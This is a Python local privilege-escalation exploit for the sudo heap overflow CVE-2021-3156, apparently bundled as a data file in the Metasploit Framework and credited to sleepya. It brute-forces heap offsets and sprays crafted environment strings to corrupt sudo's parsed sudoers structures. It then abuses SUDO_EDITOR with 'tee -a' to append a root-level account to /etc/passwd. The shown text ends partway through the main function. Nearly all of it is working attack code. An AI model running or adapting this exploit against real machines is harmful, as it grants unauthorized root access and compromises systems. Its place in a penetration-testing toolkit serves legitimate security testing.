{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-3156/userspec_generic.py", "content": "#!/usr/bin/python\n'''\nExploit for CVE-2021-3156 with struct userspec overwrite by sleepya\n\nFrom https://github.com/worawit/CVE-2021-3156\n\nThis exploit requires:\n- glibc without tcache\n- sudo version 1.8.9-1.8.23 (inclusive)\n- patient (and luck). Bruteforcing might take time (almost instant to >10 mins)\n\nNote: Disable ASLR before running the exploit if you don't want to wait for bruteforcing\n\nWithout glibc tcache, a heap layout rarely contains hole.\nThe heap overflow vulnerability is triggered after parsing /etc/sudoers.\nThe parsing process always leaves a large hole before parsed data (struct defaults, struct userspec).\n\nTested on:\n- CentOS 7 (1.8.23)\n- Ubuntu 16.04.1\n- Debian 9\n- Fedora 25\n\nsudo version related info:\nv1.8.9\n- change tq_pop to tailq_list\nv1.8.11\n- move fatal callbacks to util. so cleanup is called correctly\nv1.8.19\n- add line, file to userspec (chunk size 0x50)\nv1.8.20\n- add timeout to cmndspec\n- add notbefore and notafter to cmndspec\nv1.8.21\n- move timeout in cmndspec to avoid padding (layout is changed)\nv1.8.23\n- add comments to userspec struct (chunk size 0x60)\n- add ldap field in privileges chunk\nv1.8.24\n- add free_userpsecs() and free_defaults() with TAILQ_FIRST/TAILQ_REMOVE\n'''\nimport os\nimport subprocess\nimport sys\nimport resource\nimport select\nimport signal\nfrom struct import pack, unpack\nfrom ctypes import cdll, c_char_p, POINTER\n\nSUDO_PATH = b\"/usr/bin/sudo\"  # can be used in execve by passing argv[0] as \"sudoedit\"\n\nTEE_PATH = b\"/usr/bin/tee\"\nPASSWD_PATH = b'/etc/passwd'\n\nnew_user = sys.argv[1]              \nnew_hash = sys.argv[2]                             \n                                                                                                                  \nAPPEND_CONTENT = new_user + \":\" + new_hash + \":0:0:\" + new_user + \":/root:/bin/bash\\n\"                            \nAPPEND_CONTENT = APPEND_CONTENT.encode('latin-1')\n\nDEBUG = False\n\n# fake defaults object for finding offsets\n# expect VSYSCALL permission is \"r-x\" on old Linux kernel\nVSYSCALL_ADDR = 0xffffffffff600000\ndefaults_test_obj = [\n\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # defaults.next\n\tb\"A\"*8 + pack(\"<Q\", VSYSCALL_ADDR+0x880) + # prev, var (use syscall for testing first)\n\tb\"A\"*0x20\n]\n\nlibc = cdll.LoadLibrary(\"libc.so.6\")\nlibc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)\n\nresource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))\n\ndef execve(filename, cargv, cenvp):\n\tlibc.execve(filename, cargv, cenvp)\n\ndef spawn_raw(filename, cargv, cenvp):\n\tpid = os.fork()\n\tif pid:\n\t\t# parent\n\t\t_, exit_code = os.waitpid(pid, 0)\n\t\treturn exit_code & 0xff7f # remove coredump flag\n\telse:\n\t\t# child\n\t\texecve(filename, cargv, cenvp)\n\t\texit(0)\n\ndef spawn(filename, argv, envp):\n\tcargv = (c_char_p * len(argv))(*argv)\n\tcenvp = (c_char_p * len(envp))(*envp)\n\t# Note: error with backtrace is print to tty directly. cannot be piped or suppressd\n\tr, w = os.pipe()\n\tpid = os.fork()\n\tif not pid:\n\t\t# child\n\t\tos.close(r)\n\t\tos.dup2(w, 2)\n\t\texecve(filename, cargv, cenvp)\n\t\texit(0)\n\t# parent\n\tos.close(w)\n\t# might occur deadlock in heap. kill it if timeout and set exit_code as 6\n\t# 0.5 second should be enough for execution\n\tsr, _, _ = select.select([ r ], [], [], 0.5)\n\tif sr or DEBUG:\n\t\t_, exit_code = os.waitpid(pid, 0)\n\telse:\n\t\t# timeout, assume dead lock in heap\n\t\tos.kill(pid, signal.SIGKILL)\n\t\t_, exit_code = os.waitpid(pid, 0)\n\t\texit_code = 6\n\t\n\tr = os.fdopen(r, 'r')\n\terr = r.read()\n\tr.close()\n\treturn exit_code & 0xff7f, err  # remove coredump flag\n\ndef has_askpass(err):\n\t# 'sudoedit: no askpass program specified, try setting SUDO_ASKPASS'\n\treturn 'sudoedit: no askpass program ' in err\n\ndef find_cmnd_size():\n\targv = [ b\"sudoedit\", b\"-A\", b\"-s\", PASSWD_PATH, b\"\", None ]\n\tenv = [ b'A'*(0x401f+0x108-1), b\"LC_ALL=C\", b\"TZ=:\", None ]\n\n\tsize_min, size_max = 0xc00, 0x2000\n\tfound_size = 0\n\twhile size_max - size_min > 0x10:\n\t\tcurr_size = (size_min + size_max) // 2\n\t\tcurr_size &= 0xfff0\n\t\tprint(\"\\ncurr size: 0x%x\" % curr_size)\n\t\targv[-2] = b\"A\"*(curr_size-0x10-len(PASSWD_PATH)-1)+b'\\\\'\n\t\texit_code, err = spawn(SUDO_PATH, argv, env)\n\t\tprint(\"\\nexit code: %d\" % exit_code)\n\t\tprint(err)\n\t\tif exit_code == 256 and has_askpass(err):\n\t\t\t# need pass. no crash.\n\t\t\t# fit or almost fit\n\t\t\tif found_size:\n\t\t\t\tfound_size = curr_size\n\t\t\t\tbreak\n\t\t\t# maybe almost fit. try again\n\t\t\tfound_size = curr_size\n\t\t\tsize_min = curr_size\n\t\t\tsize_max = curr_size + 0x20\n\t\telif exit_code == 11:\n\t\t\t# segfault. too big\n\t\t\tif found_size:\n\t\t\t\tbreak\n\t\t\tsize_max = curr_size\n\t\telse:\n\t\t\t# heap corruption. too small\n\t\t\tsize_min = curr_size\n\n\tif found_size:\n\t\treturn found_size\n\tassert size_min == 0x2000 - 0x10\n\tprint('has 2 holes. very big one is bad')\n\t\n\tsize_min, size_max = 0xc00, 0x2000\n\tfor step in (0x400, 0x100, 0x40, 0x10):\n\t\tfound = False\n\t\tenv[0] = b'A'*(7+0x4010+0x110-1+step+0x100)\n\t\tfor curr_size in range(size_min, size_max, step):\n\t\t\targv[-2] = b\"A\"*(curr_size-0x10)+b'\\\\'\n\t\t\texit_code, err = spawn(SUDO_PATH, argv, env)\n\t\t\tprint(\"\\ncurr size: 0x%x\" % curr_size)\n\t\t\tprint(\"\\nexit code: %d\" % exit_code)\n\t\t\tprint(err)\n\t\t\tif exit_code in (7, 11):\n\t\t\t\tsize_min = curr_size\n\t\t\t\tfound = True\n\t\t\telif found:\n\t\t\t\tprint(\"\\nsize_min: 0x%x\" % size_min)\n\t\t\t\tbreak\n\t\tassert found, \"Cannot find cmnd size\"\n\t\tsize_max = size_min + step\n\t\n\t# TODO: verify\t\t\n\treturn size_min\n\ndef find_defaults_chunk(argv, env_prefix):\n\toffset = 0\n\tpos = len(env_prefix) - 1\n\tenv = env_prefix[:]\n\tenv.extend([ b\"LC_ALL=C\", b\"TZ=:\", None ])\n\t# overflow until sudo crash without asking pass\n\t# crash because of defaults.entries.next is overwritten\n\twhile True:\n\t\tenv[pos] += b'A'*0x10\n\t\texit_code, err = spawn(SUDO_PATH, argv, env)\n\t\t# 7 bus error, 11 segfault\n\t\tif exit_code in (7, 11) and not has_askpass(err):\n\t\t\t# found it\n\t\t\tenv[pos] = env[pos][:-0x10]\n\t\t\tbreak\n\t\toffset += 0x10\n\t\n\t# new env_prefix\n\tenv_prefix = env[:-3]\n\t\n\t# tmp env_prefix for if it is defaults\n\tenv_prefix_def = env_prefix[:]\n\tenv_prefix_def[-1] += b'\\x41\\\\'\n\tenv_prefix_def.extend([ b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\' ])\n\tenv_prefix_def.extend(defaults_test_obj)\n\t\n\t# verify if it is defaults\n\tenv = env_prefix_def[:]\n\tenv[-1] = env[-1][:-1] # remove 1 character. no overwrite next chunk with \\x00\n\tenv.extend([ b\"LC_ALL=C\", b\"TZ=:\", None ])\n\t\t\n\texit_code, err = spawn(SUDO_PATH, argv, env)\n\t# old sudo verion has no cleanup if authen fail. exit code is 256.\n\tif has_askpass(err):\n\t\tassert exit_code in (256, 11)\n\t\t#if exit_code == 256: no_cleanup = True  # old sudo version. no freeing if auth fails\n\t\t# it is defaults\n\t\treturn True, offset, env_prefix_def\n\t\n\t# no defaults, this one is likely struct member.\n\t# reset offset. very rare case.\n\tenv_prefix[-1] = env_prefix[-1][:-offset]\n\treturn False, 0, env_prefix\n\ndef find_member_chunk(argv, env_prefix):\n\t# expect username (\"root\") chunk size 0x20 then follow by struct member\n\toffset = 0\n\tpos = len(env_prefix) - 1\n\tenv = env_prefix[:]\n\tenv[-1] = env[-1][:-1]\n\tenv.extend([ b\"LC_ALL=C\", b\"TZ=:\", None ])\n\tfound_heap_corruption = False\n\tpast_member = False\n\twhile True:\n\t\texit_code, err = spawn(SUDO_PATH, argv, env)\n\t\tif not has_askpass(err) or (found_heap_corruption and exit_code == 11):\n\t\t\tassert offset > 0\n\t\t\tenv[pos] = env[pos][:-0x10]\n\t\t\toffset -= 0x10\n\t\t\tprint('decrease offset to: 0x%x' % offset)\n\t\t\tpast_member = True\n\t\t\tcontinue\n\t\tif past_member:\n\t\t\tbreak # found it\n\t\tif exit_code == 6:\n\t\t\tif found_heap_corruption:\n\t\t\t\tbreak\n\t\t\tfound_heap_corruption = True\n\t\tenv[pos] += b'A'*0x30\n\t\toffset += 0x30\n\tprint('offset member: 0x%x' % offset)\n\treturn offset\n\ndef find_first_userspec_chunk(argv, env_prefix):\n\toffset_member = find_member_chunk(argv, env_prefix)\n\t\n\t# after user member chunk, can safely skip 0x120 because of host, cmnd, cmndspec, privileges\n\tSKIP_FIND_USERSPEC_SIZE = 0x120\n\toffset_pre = offset_member + SKIP_FIND_USERSPEC_SIZE\n\n\tpos = len(env_prefix) - 1\n\tenv = env_prefix[:]\n\tenv[-1] += b'A'*offset_pre + b'A'*7 + b'\\\\' # append chunk metadata\n\ttmp_env = env[-1]\n\tenv.extend([\n\t\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\",  # next\n\t\tb\"A\"*8 + # prev\n\t\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\",  # users.first\n\t\tb\"A\"*8 + # users.last\n\t\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\",  # privileges.first\n\t\tb\"LC_ALL=C\", b\"TZ=:\", None\n\t])\n\t\n\toffset = _brute_userspec_offset(argv, env, pos, 0x100)\n\tif offset is None:\n\t\toffset = _find_single_userspec_chunk(argv, env_prefix, offset_member)\n\t\tsingle_userspec = True\n\telse:\n\t\toffset += offset_pre\n\t\tsingle_userspec = False\n\t\n\tenv_prefix[-1] += b'A'*offset\n\treturn offset, env_prefix, single_userspec\n\ndef _brute_userspec_offset(argv, env, pos, max_offset):\n\toffset = None\n\tfor i in range(0, max_offset, 0x10):\n\t\texit_code, err = spawn(SUDO_PATH, argv, env)\n\t\t#print(\"0x%x, exit: %d\" % (i, exit_code))\n\t\t#print(err)\n\t\tif has_askpass(err):\n\t\t\t# found. 256 for ver <= 1.8.10 (no cleanup callback. no crash)\n\t\t\tassert exit_code in (6, 7, 11, 256), \"unexpect exit code: %d\" % exit_code\n\t\t\toffset = i\n\t\t\tif exit_code == 6:\n\t\t\t\tbreak\n\t\telse:\n\t\t\tassert exit_code == 11, 'expect segfault. got exit_code: %d' % exit_code\n\t\t\tif offset is not None:\n\t\t\t\tbreak\n\t\t\n\t\tenv[pos] = env[pos][:-1] + b'A'*0x10 + b'\\\\'\n\t\n\treturn offset;\n\t\ndef _find_single_userspec_chunk(argv, env_prefix, offset_member=-1):\n\tif offset_member == -1:\n\t\toffset_member = find_member_chunk(argv, env_prefix)\n\t\n\t# finding offset of only one userspec needs bruteforcing a bit\n\t# we need entires.prev pointing to a valid address that contains NULL pointer.\n\t# search valid userspec by partial overwritten entries.prev\n\t# Note: this offset search method is very bad if ASLR is disabled (likely to fail)\n\t#   For quick testing: run this exploit with ASLR enabled for getting offset.\n\t#   Then, disable ASLR and rerun exploit with offset arguments\n\tprint('cannot find a userspec. assume only 1 userspec (1 rule in sudoers).')\n\tSKIP_FIND_USERSPEC_SIZE = 0x160\n\toffset_pre = offset_member + SKIP_FIND_USERSPEC_SIZE\n\n\tpos = len(env_prefix) - 1\n\tenv = env_prefix[:]\n\tenv[-1] += b'A'*offset_pre + b'A'*7 + b'\\\\' # append chunk metadata\n\ttmp_env = env[-1]\n\tenv.extend([\n\t\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\",  # next\n\t\tb\"\", b\"\",\n\t\tb\"LC_ALL=C\", b\"TZ=:\", None\n\t])\n\t\n\t# first, attempt with NULL least significant byte of prev\n\toffset = _brute_userspec_offset(argv, env, pos, 0xc0)\n\t# then, attempt with NULL 2nd least significant byte and bruteforcing least siginificat byte\n\t# normally, valid offset should be found in 1 round\n\t# if ASLR is disabed, 2nd round is useless because addresses are same as first round.\n\tfor _ in range(2):\n\t\tif offset is not None:\n\t\t\tbreak\n\t\t\n\t\tfor val in range(0, 0x100, 0x8):\n\t\t\tenv[-5] = \"\\\\\" if val == 0 else pack('<B', val)\n\t\t\tprint(\"val: 0x%x\" % val)\n\t\t\toffset = _brute_userspec_offset(argv, env, pos, 0xc0)\n\t\t\tif offset is not None:\n\t\t\t\tbreak\n\t\t\tenv[pos] = tmp_env\n\t\n\tassert offset is not None, \"Cannot find single userspec offset.\\nIf you are pretty sure of this exploit case, run an exploit again. You might have a bad luck.\"\n\tprint('offset of single userspec: 0x%x' % (offset+offset_pre))\n\treturn offset + offset_pre\n\t\n\n# for running in sudoers case (asking password before crashed).\n# find a member object offset that belongs to a running user (find until crash without asking password).\ndef find_target_userspec_chunk(argv, env_prefix):\n\tpos = len(env_prefix) - 1\n\tenv = env_prefix[:]\n\tenv.extend([ b\"LC_ALL=C\", b\"TZ=:\", None ])\n\t\n\t# verify current userspec is usable or not\n\tenv[pos] += b'A'*0x10\n\texit_code, err = spawn(SUDO_PATH, argv, env)\n\tif exit_code == 11 and not has_askpass(err):\n\t\treturn 0\n\n\tSTEP = 0x100\n\toffset_skip = 0x180\n\tenv[pos] += b'A'*(offset_skip-0x10)\n\ttmp_env = env[pos]\n\t# overwrite until sudo crash without asking password\n\toffset_max = None\n\tfor i in range(STEP, 0x1000, STEP):\n\t\tenv[pos] += b'A'*STEP\n\t\texit_code, err = spawn(SUDO_PATH, argv, env)\n\t\tif exit_code == 11 and not has_askpass(err):\n\t\t\toffset_max = i\n\t\t\tbreak\n\tassert offset_max, \"Cannot find a target userspec offset\"\n\tprint('offset_max: 0x%x' % (offset_max+offset_skip))\n\t\n\toffset_min = offset_max - STEP + offset_skip\n\tprint('offset_min: 0x%x' % offset_min)\n\tenv = env_prefix[:]\n\tenv[-1] += b'A'*offset_min\n\tenv.extend([ b'\\\\' ]*0x40)\n\tenv.extend([ b\"LC_ALL=C\", b\"TZ=:\", None ])\n\tfound_base = None\n\ttmp_env = env[pos]\n\tfor i in range(0x200, -1, -0x40):\n\t\tenv[pos] = tmp_env + b'A'*i + b'1234567\\\\'\n\t\texit_code, err = spawn(SUDO_PATH, argv, env)\n\t\t#print(\"0x%x: %d\" % (i, exit_code))\n\t\tif has_askpass(err):\n\t\t\tprint('at range: 0x%x-0x%x' % (i-0x40, i+0x30))\n\t\t\tfound_base = i\n\t\t\tbreak\n\t\n\tif found_base is None:\n\t\treturn _find_single_userspec_chunk(argv, env_prefix)\n\t\t\n\tenv_prefix[-1] += b'A'*offset_min\n\tfor i in range(found_base+0x30, found_base-0x40, -0x10):\n\t\tif verify_target_userspec_offset(argv, env_prefix, i):\n\t\t\treturn offset_min + i\n\n\tprint('Cannot find target userspec offset')\n\texit(1)\n\ndef verify_target_userspec_offset(argv, env_prefix, offset):\n\tenv = env_prefix[:]\n\tenv[-1] += b'A'*offset + b'1234567\\\\'\n\tenv.extend([\n\t\tb\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", b\"\\\\\", # next\n\t\tb\"A\"*7, # prev\n\t\tb\"LC_ALL=C\", b\"TZ=:\", None\n\t])\n\texit_code, err = spawn(SUDO_PATH, argv, env)\n\treturn has_askpass(err) and exit_code in (11, 256)\n\ndef get_sudo_version():\n\tproc = subprocess.Popen([SUDO_PATH, '-V'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)\n\tfor line in proc.stdout:\n\t\tline = line.strip()\n\t\tif not line:\n\t\t\tcontinue\n\t\tif line.startswith('Sudo version '):\n\t\t\ttxt = line[13:].strip()\n\t\t\tpos = txt.rfind('p')\n\t\t\tif pos != -1:\n\t\t\t\ttxt = txt[:pos]\n\t\t\tpos = txt.rfind('b')\n\t\t\tif pos != -1:\n\t\t\t\ttxt = txt[:pos]\n\t\t\tversions = list(map(int, txt.split('.')))\n\t\t\tbreak\n\t\n\tproc.wait()\n\treturn versions\n\t\ndef check_sudo_version():\n\tsudo_vers = get_sudo_version()\n\tassert sudo_vers[0] == 1, \"Unexpect sudo major version\"\n\tassert sudo_vers[1] == 8, \"Unexpect sudo minor version\"\n\tassert sudo_vers[2] >= 9, \"too old sudo. this exploit method is unlikely (only exploitable with rare /etc/sudoer). not implement\"\n\tif sudo_vers[2] > 23:\n\t\t# overwrite only string of first member\n\t\tprint(\"Warning: Only work if you known current user's password and no defaults. not implement\")\n\t\texit(0)\n\treturn sudo_vers[2]\n\ndef create_env(offset_defaults, offset_first_userspec, offset_userspec):\n\t# offset_userspec\n\t# - 0 if only first userspec is enough\n\t# - -1 if only single userspec\n\twith open('/proc/sys/kernel/randomize_va_space') as f: has_aslr = int(f.read()) != 0\n\tif has_aslr:\n\t\tSTACK_ADDR_PAGE = 0x7fffe5d35000\n\telse:\n\t\tSTACK_ADDR_PAGE = 0x7fffffff1000  # for ASLR disabled\n\n\tSA = STACK_ADDR_PAGE\n\n\tADDR_REFSTR = pack('<Q', SA+0x20) # ref string\n\n\tADDR_PRIV_PREV = pack('<Q', SA+0x10)\n\tADDR_CMND_PREV = pack('<Q', SA+0x18) # cmndspec\n\tADDR_MEMBER_PREV = pack('<Q', SA+0x20)\n\tADDR_USER_PREV = pack('<Q', SA+0x38)\n\n\tADDR_DEF_VAR = pack('<Q', SA+0x10)\n\tADDR_DEF_BINDING = pack('<Q', SA+0x30)\n\n\tOFFSET = 0x30 + 0x20\n\tADDR_MEMBER = pack('<Q', SA+OFFSET)\n\tADDR_USER = pack('<Q', SA+OFFSET+0x30)\n\tADDR_CMND = pack('<Q', SA+OFFSET+0x60+0x30)\n\tADDR_PRIV = pack('<Q', SA+OFFSET+0x60+0x30+0x60)\n\n\tepage = [\n\t\tb'A'*0x8 + # to not ending with 0x00\n\t\t\n\t\t# fake def->var chunk (get freed)\n\t\tb'\\x21', b'', b'', b'', b'', b'', b'',\n\t\tADDR_PRIV[:6], b'',  # pointer to privilege\n\t\tADDR_CMND[:6], b'',  # pointer to cmndspec\n\t\tADDR_MEMBER[:6], b'',  # pointer to member\n\t\t\n\t\t# fake def->binding (list head) (get freed)\n\t\tb'\\x21', b'', b'', b'', b'', b'', b'',\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # members.first\n\t\tADDR_USER[:6], b'', # members.last (unused, so use it for single userspec case)\n\t\tb'A'*0x8 + # pad\n\t\t\n\t\t# member chunk\n\t\tb'\\x31', b'', b'', b'', b'', b'', b'', # chunk size\n\t\tb'A'*8 + # member.tqe_next (can be any)\n\t\tADDR_MEMBER_PREV[:6], b'', # member.tqe_prev\n\t\tb'A'*8 + # member.name (can be any because this object is not freed)\n\t\tpack('<H', MATCH_ALL), b'',  # type, negated\n\t\tb'A'*0xc+ # padding\n\t\t\n\t\t# userspec chunk (get freed)\n\t\tb'\\x61', b'', b'', b'', b'', b'', b'', # chunk metadata\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # entries.tqe_next\n\t\tb'A'*8 +  # entries.tqe_prev\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # users.tqh_first\n\t\tADDR_MEMBER[:6]+b'', b'', # users.tqh_last\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # privileges.tqh_first\n\t\tADDR_PRIV[:6]+b'', b'', # privileges.tqh_last\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # comments.stqh_first\n\t\tADDR_MEMBER_PREV[:6], b'', # comments.stqh_last (can be any), file for <1.8.23\n\t\tb'A'*8 + # lineno (can be any)\n\t\tADDR_MEMBER_PREV[:6], b'', # file (ref string)\n\t\tb'A'*8 + # padding\n\t\t\n\t\t# cmndspec chunk\n\t\tb'\\x61', b'', b'', b'', b'', b'', b'', # chunk size\n\t\t#b'\\x61'*0x8 + # chunk metadata (need only prev_inuse flag)\n\t\tb'A'*0x8 + # entries.tqe_next\n\t\tADDR_CMND_PREV[:6], b'',  # entries.teq_prev\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # runasuserlist\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # runasgrouplist\n\t\tADDR_MEMBER[:6], b'',  # cmnd\n\t\tb'\\xf9'+b'\\xff'*7 + # tag (NOPASSWD), timeout\n\t\t(b'' if sudo_ver < 20 else b'\\xff'*0x10) + # notbefore, notafter\n\t\t(b'\\xff'*8 if sudo_ver == 20 else b'') + # timeout for version 1.8.20\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # role\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # type\n\t\t(b'' if sudo_ver == 20 else b'A'*(0x18 if sudo_ver < 20 else 8)) + # padding\n\t\t\n\t\t# privileges chunk\n\t\tb'\\x51'*0x8 + # chunk metadata\n\t\tb'A'*0x8 + # entries.tqe_next\n\t\tADDR_PRIV_PREV[:6], b'',  # entries.teq_prev\n\t\t(b'A'*8 if has_ldap else b'') + # ldap_role\n\t\tb'A'*8 + # hostlist.tqh_first\n\t\tADDR_MEMBER[:6], b'',  # hostlist.tqh_last\n\t\tb'A'*8 + # cmndlist.tqh_first\n\t\tADDR_CMND[:6], b'',  # cmndlist.tqh_last\n\t\tb'', b'', b'', b'', b'', b'', b'', b'', # defaults.tqh_first\n\t]\n\n\tenv = [ b'A'*(0x401f+0x108) ]\n\tif offset_defaults != -1:\n\t\tenv[-1] += b'A'*(offset_defaults) + b'\\x41\\\\'\n\t\tenv.extend([\n\t\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', # chunk metadata\n\t\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', # next\n\t\t\tb'a'*8 + # prev\n\t\t\tADDR_DEF_VAR[:6]+b'\\\\', b'\\\\', # var\n\t\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', # val\n\t\t\tADDR_DEF_BINDING[:6]+b'\\\\', b'\\\\', # binding\n\t\t\tADDR_REFSTR[:6]+b'\\\\', b'\\\\',  # file\n\t\t\tb\"Z\"*0x8+  # type, op, error, lineno\n\t\t\tb'\\x31\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', # next\n\t\t])\n\t\toffset_first_userspec -= 8\n\t\n\tchunk_size_byte = pack('B', userspec_chunk_size+1)\n\ttmp = b'A'*(offset_first_userspec) + chunk_size_byte + b'\\\\'\n\tif env[-1] == b'\\\\':\n\t\tenv.append(tmp)\n\telse:\n\t\tenv[-1] += tmp\n\tenv.extend([ b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\' ]) # complete userspec chunk size\n\n\tif offset_userspec != 0:\n\t\tenv.extend([\n\t\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', # entries.tqe_next\n\t\t\tb\"A\"*8 + # entries.tqe_prev\n\t\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', # users.tqh_first\n\t\t\tb\"A\"*8 + # users.tqh_last\n\t\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', # privileges.tqh_first\n\t\t\tb\"A\"*8 # privileges.tqh_last\n\t\t])\n\t\tif userspec_chunk_size == 0x60: # has comments\n\t\t\tenv[-1] += '\\\\'\n\t\t\tenv.extend([\n\t\t\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', # comments.tqh_first\n\t\t\t\tb\"A\"*8 # comments.tqh_last\n\t\t\t])\n\t\tif userspec_chunk_size >= 0x50:\n\t\t\tenv[-1] += b'A'*8 + ADDR_REFSTR[:6] + b'\\\\'\n\t\t\tenv.append(b'\\\\')\n\t\t\tenv.append(b'A'*8 + b'\\x21\\\\')  # padding, chunk size\n\t\telse:\n\t\t\tenv[-1] += b'A'*8 + b'\\x21\\\\'  # padding, chunk size\n\t\tenv.extend([\n\t\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\',  # need valid chunk metadata\n\t\t\tb'A'*(offset_userspec-userspec_chunk_size-8+8-1)+b'\\\\'\n\t\t])\n\t\t\n\tenv.extend([\n\t\t# userspec chunk\n\t\t# for single userspec, sudo might pass checking and cause heap corruption when freeing\n\t\t#   stack memory (with all zero). this case is slower than other cases.\n\t\t# for >=2 userspecs, this chunk is not used because list is iterated with head->last->prev->next\n\t\tADDR_USER[:6]+b'\\\\', b'\\\\', # entries.tqe_next\n\t\tADDR_USER_PREV[:6]+b'\\\\', b'\\\\', # entries.tqe_prev\n\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', # users.tqh_first\n\t\t#ADDR_MEMBER[:6]+b'\\\\', b'\\\\', # users.tqh_last\n\t\tb'A'*8 + # users.tqh_last\n\t\tb'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'\\\\', b'', # privileges.tqh_first\n\t\tb\"LC_ALL=C\",\n\t\tb\"SUDO_EDITOR=\"+TEE_PATH+b\" -a\", # append stdin to /etc/passwd\n\t\tb\"TZ=:\",\n\t])\n\t\n\t# fill spray data\n\tcnt = sum(map(len, epage))\n\tpadlen = 4096 - cnt - len(epage)\n\tepage.append(b'P'*(padlen-1))\n\n\tENV_STACK_SIZE_MB = 4\n\tfor i in range(ENV_STACK_SIZE_MB * 1024 // 4):\n\t\tenv.extend(epage)\n\n\t# reserve space in last element for '/usr/bin/sudo' and padding\n\tenv[-1] = env[-1][:-14-8]\n\tenv.append(None)\n\n\treturn env\n\ndef run_until_success(argv, env):\n\tcargv = (c_char_p * len(argv))(*argv)\n\tcenvp = (c_char_p * len(env))(*env)\n\n\tr, w = os.pipe()\n\tos.dup2(r, 0)\n\tw = os.fdopen(w, 'wb')\n\tw.write(APPEND_CONTENT)\n\tw.close()\n\n\tnull_fd = os.open('/dev/null', os.O_RDWR)\n\tos.dup2(null_fd, 2)\n\n\tfor i in range(16384):\n\t\tsys.stdout.write('%d\\r' % i)\n\t\tif i % 8 == 0:\n\t\t\tsys.stdout.flush()\n\t\texit_code = spawn_raw(SUDO_PATH, cargv, cenvp)\n\t\tif exit_code == 0:\n\t\t\tprint(\"Success at %d\" % i)\n\t\t\tbreak\n\t\tif exit_code not in (6, 7, 11):\n\t\t\tprint(\"Invalid offset. exit code: %d\" % exit_code)\n\t\t\tbreak\n\telse:\n\t\tprint(\"Brute force failed\")\n\ndef main():\n\tcmnd_size = find_cmnd_size()\n\tprint(\"found cmnd size: 0x%x\" % cmnd_size)\n\n\targv = [ b\"sudoedit\", b\"-A\", b\"-s\", PASSWD_PATH, b\"A\"*(cmnd_size-0x10-len(PASSWD_PATH)-1)+b\"\\\\\", None ]\n\n\tenv_prefix = [ b'A'*(7+0x4010+0x110) ]\n\n\toffset_defaults = -1\n\tfound_defaults, offset, env_prefix = find_defaults_chunk(argv, env_prefix)\n\tif found_defaults:\n\t\toffset_defaults = offset\n\t\tprint('found defaults, offset: 0x%x' % offset_defaults)\n\telse:\n\t\tprint('no defaults in /etc/sudoers')\n\t\toffset_defaults = -1\n\n\tif has_fatal_cleanup:\n\t\toffset, env_prefix, single_userspec = find_first_userspec_chunk(argv, env_prefix)\n\t\toffset_first_userspec = offset\n\t\tprint(\"\\noffset to first userspec: 0x%x\" % offset_first_userspec)\n\t\tif single_userspec:\n\t\t\tprint(\"single userspec mode\")\n\t\t\toffset_userspec = 0\n\telse:\n\t\toffset_first_userspec = 0\n\n\toffset_userspec = find_target_userspec_chunk(argv, env_prefix)\n\n\tprint('')\n\tprint(\"cmnd size: 0x%x\" % cmnd_size)\n\toffset_defaults_txt = -1 if offset_defaults == -1 else \"0x%x\" % offset_defaults\n\tprint(\"offset to defaults: %s\" % offset_defaults_txt)\n\tprint(\"offset to first userspec: 0x%x\" % offset_first_userspec)\n\toffset_userspec_txt = -1 if offset_userspec == -1 else \"0x%x\" % offset_userspec\n\tprint(\"offset to userspec: %s\" % offset_userspec_txt)\n\tprint(\"\\nto skip finding offsets next time no this machine, run: \")\n\tprint(\"%s 0x%x %s 0x%x %s\" % (sys.argv[0], cmnd_size, offset_defaults_txt, offset_first_userspec, offset_userspec_txt))\n\n\tif offset_first_userspec == 0:\n\t\tif not has_fatal_cleanup:\n\t\t\tprint(\"\\nTarget sudo has bug. No idea to find first userspec.\")\n\t\t\tprint(\"So the exploit will fail if a running user is in sudoers and not in first two rules.\")\n\t\t# swap value to use only first 